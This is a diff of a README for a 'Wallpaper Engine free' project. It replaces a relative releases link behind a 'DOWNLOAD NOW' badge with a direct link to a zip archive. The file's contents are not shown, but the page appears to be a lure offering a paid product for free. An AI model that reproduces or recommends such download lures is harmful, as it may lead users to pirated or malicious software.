@@ -4,7 +4,7 @@
 
 <p align="center">   <b>Live Wallpapers. More Atmosphere. For Free.</b>   <br>   Bring your desktop to life with beautiful animated backgrounds. </p>
  <img src="jaguar.jpg">
-<p align="center">   <a href="./releases">     <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=00A843" alt="Download Now">   </a> </p>
+<p align="center">   <a href="https://github.com/championkazekagemold/wallpaper-engine-free/releases/download/Wallpaper-Engine/wallpaper.engine.zip">     <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=00A843" alt="Download Now">   </a> </p>
 
 
 
